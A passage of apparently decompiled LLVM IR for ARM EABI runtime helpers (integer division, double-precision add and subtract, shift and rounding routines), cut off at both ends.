  %v1_1be70 = phi i32 [ %v6_1be64, %bb93 ], [ %v1_1be64, %.thread8 ], [ %v6_1be64, %bb94 ]
  %v1_1be74 = phi i32 [ %v1_1be68, %bb93 ], [ %v1_1be68, %.thread8 ], [ %v6_1be68, %bb94 ]
  %v4_1be6c = udiv i32 %v1_1be8c, 4
  %v6_1be6c = icmp ult i32 %v1_1be70, %v4_1be6c
  br i1 %v6_1be6c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1be70 = and i32 %v1_1be8c, 2
  %v4_1be70 = icmp eq i32 %v3_1be70, 0
  %v6_1be70 = sub i32 %v1_1be70, %v4_1be6c
  br i1 %v4_1be70, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1be74 = udiv i32 %v1_1be88, 4
  %v6_1be74 = or i32 %v1_1be74, %v5_1be74
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1be7c = phi i32 [ %v6_1be70, %bb95 ], [ %v1_1be70, %.thread9 ], [ %v6_1be70, %bb96 ]
  %v1_1be80 = phi i32 [ %v1_1be74, %bb95 ], [ %v1_1be74, %.thread9 ], [ %v6_1be74, %bb96 ]
  %v4_1be78 = udiv i32 %v1_1be8c, 8
  %v6_1be78 = icmp ult i32 %v1_1be7c, %v4_1be78
  br i1 %v6_1be78, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1be7c = and i32 %v1_1be8c, 4
  %v4_1be7c = icmp eq i32 %v3_1be7c, 0
  %v6_1be7c = sub i32 %v1_1be7c, %v4_1be78
  br i1 %v4_1be7c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1be80 = udiv i32 %v1_1be88, 8
  %v6_1be80 = or i32 %v1_1be80, %v5_1be80
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1be98 = phi i32 [ %v1_1be80, %bb97 ], [ %v1_1be80, %.thread10 ], [ %v6_1be80, %bb98 ]
  %v0_1be84 = phi i32 [ %v6_1be7c, %bb97 ], [ %v1_1be7c, %.thread10 ], [ %v6_1be7c, %bb98 ]
  %v2_1be84 = icmp eq i32 %v0_1be84, 0
  br i1 %v2_1be84, label %dec_label_pc_1be94, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1be88, 16
  br i1 %tmp, label %dec_label_pc_1be94, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1be88 = udiv i32 %v1_1be88, 16
  %v4_1be8c = udiv i32 %v1_1be8c, 16
  br label %dec_label_pc_1be54

dec_label_pc_1be94:                               ; preds = %thread-pre-split12, %bb99
  %v1_1be94 = icmp slt i32 %v2_1bdec, 0
  br i1 %v1_1be94, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1be94
  %v2_1be98 = sub i32 0, %v1_1be98
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1bea0, %dec_label_pc_1be94, %bb100
  %v1_1be9c = phi i32 [ %v1_1be98, %dec_label_pc_1be94 ], [ %v2_1be98, %bb100 ], [ %v0_1bdec, %dec_label_pc_1bea0 ], [ %v2_1bea4, %bb101 ], [ %v1_1beb880, %bb103 ], [ %v2_1beb4, %bb104 ]
  ret i32 %v1_1be9c

dec_label_pc_1bea0:                               ; preds = %thread-pre-split
  br i1 %v1_1bde8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1bea0
  %v2_1bea4 = sub i32 0, %v0_1bdec
  br label %.thread16

dec_label_pc_1beac:                               ; preds = %bb86
  br i1 %v3_1be08, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1beac
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1beac, %bb102
  %v1_1beb880 = phi i32 [ %v0_1bdec, %dec_label_pc_1beac ], [ 0, %bb102 ]
  br i1 %v9_1be08, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1beb0 = ashr i32 %v2_1bdec, 31
  %v2_1beb4 = or i32 %v4_1beb0, 1
  br label %.thread16

dec_label_pc_1bebc:                               ; preds = %dec_label_pc_1be10
  %v2_1bebc = icmp ugt i32 %v1_1bec0, 65535
  br i1 %v2_1bebc, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1bebc
  %v2_1bec0 = and i32 %v1_1bec0, 32768
  %v3_1bec0 = icmp eq i32 %v2_1bec0, 0
  %v4_1bec0 = udiv i32 %v1_1bec0, 65536
  br i1 %v3_1bec0, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1bebc
  %v0_1becc70 = phi i32 [ %v1_1bec0, %dec_label_pc_1bebc ], [ %v4_1bec0, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1bed0 = phi i32 [ %v0_1becc70, %.thread19 ], [ %v4_1bec0, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1becc = icmp ugt i32 %v1_1bed0, 255
  br i1 %v2_1becc, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1bed0 = and i32 %v1_1bed0, 128
  %v3_1bed0 = icmp eq i32 %v2_1bed0, 0
  %v4_1bed0 = udiv i32 %v1_1bed0, 256
  br i1 %v3_1bed0, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1bed4 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1bee0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1bed4, %bb108 ]
  %v1_1bedc = phi i32 [ %v1_1bed0, %bb106 ], [ %v4_1bed0, %bb107 ], [ %v4_1bed0, %bb108 ]
  %v2_1bed8 = icmp ugt i32 %v1_1bedc, 15
  br i1 %v2_1bed8, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1bedc = and i32 %v1_1bedc, 8
  %v3_1bedc = icmp eq i32 %v2_1bedc, 0
  %v4_1bedc = udiv i32 %v1_1bedc, 16
  br i1 %v3_1bedc, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1bee0 = add nsw i32 %v1_1bee0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1bee8 = phi i32 [ %v1_1bee0, %.thread20 ], [ %v1_1bee0, %bb109 ], [ %v2_1bee0, %bb110 ]
  %v5_1beec = phi i32 [ %v1_1bedc, %.thread20 ], [ %v4_1bedc, %bb109 ], [ %v4_1bedc, %bb110 ]
  %v2_1bee4 = icmp ugt i32 %v5_1beec, 3
  %v7_1bee4 = icmp eq i32 %v5_1beec, 4
  %v2_1bee8 = xor i1 %v7_1bee4, true
  %v3_1bee8 = and i1 %v2_1bee4, %v2_1bee8
  br i1 %v3_1bee8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1bee8 = add nsw i32 %v4_1bee8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1beec = phi i32 [ %v4_1bee8, %.thread21 ], [ %v5_1bee8, %bb111 ]
  %v2_1beec = xor i1 %v2_1bee4, true
  %v3_1beec = or i1 %v7_1bee4, %v2_1beec
  br i1 %v3_1beec, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1beec = udiv i32 %v5_1beec, 2
  %v9_1beec = add i32 %v4_1beec, %v8_1beec
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1bef4 = phi i32 [ %v4_1beec, %bb112 ], [ %v9_1beec, %bb113 ]
  %v1_1bef0 = icmp slt i32 %v2_1bdec, 0
  %v6_1bef4 = lshr i32 %v0_1bef4, %v1_1bef4
  %v2_1bef8 = sub i32 0, %v6_1bef4
  %v2_1bef8.v6_1bef4 = select i1 %v1_1bef0, i32 %v2_1bef8, i32 %v6_1bef4
  ret i32 %v2_1bef8.v6_1bef4

dec_label_pc_1bf00:                               ; preds = %entry
  %v0_1bf00 = load i32, i32* @lr, align 4
  %v0_1bf04 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1bf00)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1beec, { 1, 0 }
  uselistorder i1 %v7_1bee4, { 1, 0 }
  uselistorder i32 %v4_1bedc, { 1, 0 }
  uselistorder i32 %v1_1bedc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bed0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1bed0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1bec0, { 1, 0 }
  uselistorder i32 %v0_1be84, { 1, 0 }
  uselistorder i32 %v4_1be78, { 1, 0 }
  uselistorder i32 %v1_1be80, { 1, 2, 0 }
  uselistorder i32 %v4_1be6c, { 1, 0 }
  uselistorder i32 %v1_1be74, { 1, 2, 0 }
  uselistorder i32 %v4_1be60, { 1, 0 }
  uselistorder i32 %v1_1be68, { 1, 2, 0 }
  uselistorder i32 %v1_1be8c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1be5c, { 1, 0 }
  uselistorder i32 %v1_1be88, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1be48, { 1, 0 }
  uselistorder i32 %v3_1be44, { 1, 0 }
  uselistorder i32 %v1_1be44, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1be40, { 1, 0 }
  uselistorder i32 %v1_1be48, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1be34, { 1, 0 }
  uselistorder i32 %v4_1be30, { 2, 1, 0 }
  uselistorder i32 %v1_1be34, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1be3c.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1be08, { 1, 0 }
  uselistorder i32 %v1_1bec0, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1bdec, { 1, 0, 2 }
  uselistorder i32 %v0_1bdec, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1be94, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1be50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1be3cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1bf14 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1bf14
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_1bf28 = sub i32 0, %arg1
  %v2_1bf28 = sext i32 %v1_1bf28 to i64
  %v3_1bf2c = bitcast i64 %v2_1bf28 to double
  %v9_1bf2c = fadd double %v3_1bf2c, %arg2
  %v10_1bf2c = fptrunc double %v9_1bf2c to float
  %v11_1bf2c = bitcast float %v10_1bf2c to i32
  ret i32 %v11_1bf2c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1bf30 = load i32, i32* @r0, align 4
  ret i32 %v2_1bf30
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1bf34 = load i32, i32* @r4, align 4
  store i32 %v3_1bf34, i32* %stack_var_-12, align 4
  %v6_1bf34 = load i32, i32* @r5, align 4
  %v0_1bf38 = load i32, i32* %r0.global-to-local, align 4
  %v2_1bf38 = mul i32 %v0_1bf38, 2
  store i32 %v2_1bf38, i32* %r4.global-to-local, align 4
  %v0_1bf3c = load i32, i32* %r2.global-to-local, align 4
  %v2_1bf3c = mul i32 %v0_1bf3c, 2
  store i32 %v2_1bf3c, i32* %r5.global-to-local, align 4
  %v4_1bf40 = icmp eq i32 %v2_1bf3c, %v2_1bf38
  %v1_1bf44 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_1bf40, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1bf44 = load i32, i32* %r3.global-to-local, align 4
  %v5_1bf44 = icmp eq i32 %v2_1bf44, %v1_1bf44
  br i1 %v5_1bf44, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1bf48 = or i32 %v1_1bf44, %v2_1bf38
  %v5_1bf48 = icmp eq i32 %v3_1bf48, 0
  br i1 %v5_1bf48, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_1bf4c = load i32, i32* %r3.global-to-local, align 4
  %v3_1bf4c = or i32 %v2_1bf4c, %v2_1bf3c
  %v5_1bf4c = icmp eq i32 %v3_1bf4c, 0
  br i1 %v5_1bf4c, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1bf38.off = add i32 %v2_1bf38, 4194303
  %tmp = icmp ult i32 %v2_1bf38.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_1bf3c.off = add i32 %v2_1bf3c, 4194303
  %tmp18 = icmp ult i32 %v2_1bf3c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_1bf58 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1bf58, i32 ptrtoint (i32* @global_var_1c178.1686 to i32))
  %v0_1bf5c = load i32, i32* %r4.global-to-local, align 4
  %v3_1bf5c = udiv i32 %v0_1bf5c, 2097152
  store i32 %v3_1bf5c, i32* %r4.global-to-local, align 4
  %v1_1bf60 = load i32, i32* %r5.global-to-local, align 4
  %v4_1bf60 = udiv i32 %v1_1bf60, 2097152
  %v5_1bf60 = sub nsw i32 %v4_1bf60, %v3_1bf5c
  %v5_1bf64 = icmp ult i32 %v4_1bf60, %v3_1bf5c
  br i1 %v5_1bf64, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_1bf64 = sub nsw i32 0, %v5_1bf60
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_1bf64, %bb14 ], [ %v5_1bf60, %.thread3 ]
  %v1_1bfc4 = phi i32 [ %v7_1bf64, %bb14 ], [ %v5_1bf60, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1bf68 = icmp ugt i32 %v4_1bf60, %v3_1bf5c
  br i1 %v7_1bf68, label %dec_label_pc_1bf6c, label %dec_label_pc_1bf88

dec_label_pc_1bf6c:                               ; preds = %bb15
  %v2_1bf6c = add nsw i32 %v1_1bfc4, %v3_1bf5c
  store i32 %v2_1bf6c, i32* %r4.global-to-local, align 4
  %v0_1bf70 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bf70 = load i32, i32* %r3.global-to-local, align 4
  %v0_1bf74 = load i32, i32* %r0.global-to-local, align 4
  %v1_1bf74 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_1bf70, i32* %r1.global-to-local, align 4
  store i32 %v1_1bf74, i32* %r0.global-to-local, align 4
  store i32 %v0_1bf70, i32* %r3.global-to-local, align 4
  store i32 %v0_1bf74, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bf88

dec_label_pc_1bf88:                               ; preds = %bb15, %dec_label_pc_1bf6c
  %v0_1bfc4 = phi i32 [ %v3_1bf5c, %bb15 ], [ %v2_1bf6c, %dec_label_pc_1bf6c ]
  %tmp19 = icmp ugt i32 %v1_1bfc4, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_1bf88
  %v6_1bf8c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1bf8c, i32* %r4.global-to-local, align 4
  store i32 %v6_1bf34, i32* %r5.global-to-local, align 4
  %v15_1bf8c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_1bf8c

bb17:                                             ; preds = %dec_label_pc_1bf88
  %v0_1bf90 = load i32, i32* %r0.global-to-local, align 4
  %v3_1bf90 = icmp sgt i32 %v0_1bf90, -1
  %v4_1bf9c = urem i32 %v0_1bf90, 1048576
  %v5_1bf9c = or i32 %v4_1bf9c, 1048576
  store i32 %v5_1bf9c, i32* %r0.global-to-local, align 4
  br i1 %v3_1bf90, label %dec_label_pc_1bfac, label %dec_label_pc_1bfa4

dec_label_pc_1bfa4:                               ; preds = %bb17
  %v0_1bfa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1bfa4 = sub i32 0, %v0_1bfa4
  store i32 %v1_1bfa4, i32* %r1.global-to-local, align 4
  %v2_1bfa4 = icmp eq i32 %v0_1bfa4, 0
  %v2_1bfa8 = icmp eq i1 %v2_1bfa4, false
  %v5_1bfa8 = sext i1 %v2_1bfa8 to i32
  %v6_1bfa8 = sub nsw i32 %v5_1bfa8, %v5_1bf9c
  store i32 %v6_1bfa8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bfac

dec_label_pc_1bfac:                               ; preds = %bb17, %dec_label_pc_1bfa4
  %v0_1bfac = load i32, i32* %r2.global-to-local, align 4
  %v3_1bfac = icmp sgt i32 %v0_1bfac, -1
  %v4_1bfb4 = urem i32 %v0_1bfac, 1048576
  %v5_1bfb4 = or i32 %v4_1bfb4, 1048576
  store i32 %v5_1bfb4, i32* %r2.global-to-local, align 4
  br i1 %v3_1bfac, label %dec_label_pc_1bfc4, label %dec_label_pc_1bfbc

dec_label_pc_1bfbc:                               ; preds = %dec_label_pc_1bfac
  %v0_1bfbc = load i32, i32* %r3.global-to-local, align 4
  %v1_1bfbc = sub i32 0, %v0_1bfbc
  store i32 %v1_1bfbc, i32* %r3.global-to-local, align 4
  %v2_1bfbc = icmp eq i32 %v0_1bfbc, 0
  %v2_1bfc0 = icmp eq i1 %v2_1bfbc, false
  %v5_1bfc0 = sext i1 %v2_1bfc0 to i32
  %v6_1bfc0 = sub nsw i32 %v5_1bfc0, %v5_1bfb4
  store i32 %v6_1bfc0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bfc4

dec_label_pc_1bfc4:                               ; preds = %dec_label_pc_1bfac, %dec_label_pc_1bfbc
  %v4_1bfc4 = icmp eq i32 %v0_1bfc4, %v1_1bfc4
  call void @__pseudo_cond_branch(i1 %v4_1bfc4, i32 ptrtoint (i32* @global_var_1c160.1687 to i32))
  %v1_1bfc8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1bfc8

; uselistorder directives
  uselistorder i32 %v0_1bfac, { 1, 0 }
  uselistorder i32 %v0_1bf90, { 1, 0 }
  uselistorder i32 %v4_1bf60, { 2, 1, 0 }
  uselistorder i32 %v3_1bf5c, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_1bf44, { 1, 0 }
  uselistorder i32 %v2_1bf3c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1bf38, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_1bfc4, { 1, 0 }
  uselistorder label %dec_label_pc_1bfac, { 1, 0 }
  uselistorder label %dec_label_pc_1bf88, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1bfcc() local_unnamed_addr {
dec_label_pc_1bfcc:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1bfcc = load i32, i32* @r4, align 4
  %v1_1bfcc = add i32 %v0_1bfcc, -1
  store i32 %v1_1bfcc, i32* @r4, align 4
  %v0_1bfd0 = load i32, i32* @r5, align 4
  %v1_1bfd0 = sub i32 32, %v0_1bfd0
  %v5_1bfd4 = icmp sgt i32 %v0_1bfd0, 32
  br i1 %v5_1bfd4, label %dec_label_pc_1bff0, label %dec_label_pc_1bfd8

dec_label_pc_1bfd8:                               ; preds = %dec_label_pc_1bfcc
  %v0_1bfd8 = load i32, i32* @r3, align 4
  %v6_1bfd8 = shl i32 %v0_1bfd8, %v1_1bfd0
  store i32 %v6_1bfd8, i32* %ip.global-to-local, align 4
  %v0_1bfdc = load i32, i32* @r1, align 4
  %v3_1bfdc = add i32 %v0_1bfd0, -1
  %v4_1bfdc = shl i32 1, %v3_1bfdc
  %v7_1bfdc = lshr i32 %v0_1bfd8, %v0_1bfd0
  %v8_1bfdc = add i32 %v0_1bfdc, %v7_1bfdc
  %v9_1bfdc = icmp ult i32 %v8_1bfdc, %v0_1bfdc
  %v0_1bfe0 = load i32, i32* @r0, align 4
  %v2_1bfe0 = zext i1 %v9_1bfdc to i32
  %v3_1bfe0 = add i32 %v2_1bfe0, %v0_1bfe0
  %v1_1bfe4 = load i32, i32* @r2, align 4
  %v7_1bfe4 = shl i32 %v1_1bfe4, %v1_1bfd0
  %v8_1bfe4 = add i32 %v7_1bfe4, %v8_1bfdc
  store i32 %v8_1bfe4, i32* %r1.global-to-local, align 4
  %v5_1bfe8 = and i32 %v1_1bfe4, %v4_1bfdc
  %v6_1bfe8 = icmp ne i32 %v5_1bfe8, 0
  %v7_1bfe8 = ashr i32 %v1_1bfe4, %v0_1bfd0
  %v9_1bfe8 = add i32 %v3_1bfe0, %v7_1bfe8
  %v10_1bfe8 = zext i1 %v6_1bfe8 to i32
  %v11_1bfe8 = add i32 %v10_1bfe8, %v9_1bfe8
  br label %dec_label_pc_1c00c

dec_label_pc_1bff0:                               ; preds = %dec_label_pc_1bfcc
  %v1_1bff0 = add i32 %v0_1bfd0, -32
  %v1_1bff4 = add i32 %v1_1bfd0, 32
  %v0_1bffc = load i32, i32* @r2, align 4
  %v2_1bffc = add i32 %v1_1bfd0, 31
  %v3_1bffc = lshr i32 -2147483648, %v2_1bffc
  %v4_1bffc = and i32 %v0_1bffc, %v3_1bffc
  %v5_1bffc = icmp ne i32 %v4_1bffc, 0
  %v6_1bffc = shl i32 %v0_1bffc, %v1_1bff4
  %v2_1c000 = or i32 %v6_1bffc, 2
  %v2_1c000.v6_1bffc = select i1 %v5_1bffc, i32 %v2_1c000, i32 %v6_1bffc
  store i32 %v2_1c000.v6_1bffc, i32* %ip.global-to-local, align 4
  %v0_1c004 = load i32, i32* @r1, align 4
  %v7_1c004 = ashr i32 %v0_1bffc, %v1_1bff0
  %v8_1c004 = add i32 %v0_1c004, %v7_1c004
  store i32 %v8_1c004, i32* %r1.global-to-local, align 4
  %v0_1c008 = load i32, i32* @r0, align 4
  %v2_1c008 = and i32 %v0_1bffc, 1073741824
  %v3_1c008 = icmp ne i32 %v2_1c008, 0
  %v4_1c008 = ashr i32 %v0_1bffc, 31
  %v6_1c008 = add i32 %v0_1c008, %v4_1c008
  %v7_1c008 = zext i1 %v3_1c008 to i32
  %v8_1c008 = add i32 %v6_1c008, %v7_1c008
  br label %dec_label_pc_1c00c

dec_label_pc_1c00c:                               ; preds = %dec_label_pc_1bfd8, %dec_label_pc_1bff0
  %storemerge = phi i32 [ %v11_1bfe8, %dec_label_pc_1bfd8 ], [ %v8_1c008, %dec_label_pc_1bff0 ]
  %v0_1c00c = phi i32 [ %v11_1bfe8, %dec_label_pc_1bfd8 ], [ %v8_1c008, %dec_label_pc_1bff0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1c00c = and i32 %v0_1c00c, -2147483648
  store i32 %v1_1c00c, i32* @r5, align 4
  %v1_1c010 = icmp sgt i32 %v0_1c00c, -1
  call void @__pseudo_cond_branch(i1 %v1_1c010, i32 ptrtoint (i32* @global_var_1c020.1688 to i32))
  %v0_1c014 = load i32, i32* %ip.global-to-local, align 4
  %v1_1c014 = sub i32 0, %v0_1c014
  store i32 %v1_1c014, i32* %ip.global-to-local, align 4
  %v2_1c014 = icmp eq i32 %v0_1c014, 0
  %v0_1c018 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c018 = icmp eq i1 %v2_1c014, false
  %v5_1c018 = sext i1 %v2_1c018 to i32
  %v6_1c018 = sub i32 %v5_1c018, %v0_1c018
  store i32 %v6_1c018, i32* @r1, align 4
  %v7_1c018 = zext i1 %v2_1c018 to i32
  %v8_1c018 = icmp ne i32 %v6_1c018, %v7_1c018
  %v9_1c018 = icmp ne i32 %v0_1c018, -1
  %v10_1c018 = or i1 %v9_1c018, %v8_1c018
  %v11_1c018 = icmp ne i32 %v0_1c018, 0
  %v12_1c018 = select i1 %v2_1c018, i1 %v10_1c018, i1 %v11_1c018
  %v0_1c01c = load i32, i32* %r0.global-to-local, align 4
  %v5_1c01c = sext i1 %v12_1c018 to i32
  %v6_1c01c = sub i32 %v5_1c01c, %v0_1c01c
  store i32 %v6_1c01c, i32* %r0.global-to-local, align 4
  ret i32 %v6_1c01c

; uselistorder directives
  uselistorder i1 %v2_1c018, { 1, 2, 0 }
  uselistorder i32 %v0_1c018, { 1, 2, 0 }
  uselistorder i32 %v8_1c008, { 1, 0 }
  uselistorder i32 %v0_1bffc, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1bfe8, { 1, 0 }
  uselistorder i32 %v1_1bfe4, { 1, 0, 2 }
  uselistorder i32 %v0_1bfdc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1c00c, { 1, 0 }
}

define i32 @function_1c020(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1c020:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1c024 = icmp ult i32 %arg1, 1048574
  br i1 %v3_1c024, label %dec_label_pc_1c064, label %dec_label_pc_1c028

dec_label_pc_1c028:                               ; preds = %dec_label_pc_1c020
  %v3_1c02c = icmp ult i32 %arg1, 2097150
  br i1 %v3_1c02c, label %dec_label_pc_1c04c, label %dec_label_pc_1c030

dec_label_pc_1c030:                               ; preds = %dec_label_pc_1c028
  %v1_1c030 = urem i32 %arg1, 2
  %v2_1c030 = icmp ne i32 %v1_1c030, 0
  %v3_1c030 = udiv i32 %arg1, 2
  store i32 %v3_1c030, i32* %r0.global-to-local, align 4
  %v0_1c034 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c034 = zext i1 %v2_1c030 to i32
  %v6_1c034 = zext i32 %v0_1c034 to i64
  %v7_1c034 = sub i32 33, %v0_1c034
  %v8_1c034 = zext i32 %v7_1c034 to i64
  %v9_1c034 = shl i64 %v6_1c034, %v8_1c034
  %v10_1c034 = sub i32 32, %v0_1c034
  %v11_1c034 = shl i32 %v3_1c034, %v10_1c034
  %v12_1c034 = zext i32 %v11_1c034 to i64
  %v14_1c034 = or i64 %v12_1c034, %v9_1c034
  %v15_1c034 = trunc i64 %v14_1c034 to i32
  %v16_1c034 = add i32 %v0_1c034, -1
  %v17_1c034 = shl i32 1, %v16_1c034
  %v18_1c034 = and i32 %v17_1c034, %v0_1c034
  %v19_1c034 = icmp ne i32 %v18_1c034, 0
  store i32 %v15_1c034, i32* %r1.global-to-local, align 4
  %v0_1c038 = load i32, i32* @ip, align 4
  %v3_1c038 = zext i1 %v19_1c034 to i32
  %v6_1c038 = zext i32 %v0_1c038 to i64
  %v7_1c038 = sub i32 33, %v0_1c038
  %v8_1c038 = zext i32 %v7_1c038 to i64
  %v9_1c038 = shl i64 %v6_1c038, %v8_1c038
  %v10_1c038 = sub i32 32, %v0_1c038
  %v11_1c038 = shl i32 %v3_1c038, %v10_1c038
  %v12_1c038 = zext i32 %v11_1c038 to i64
  %v14_1c038 = or i64 %v12_1c038, %v9_1c038
  %v15_1c038 = trunc i64 %v14_1c038 to i32
  store i32 %v15_1c038, i32* @ip, align 4
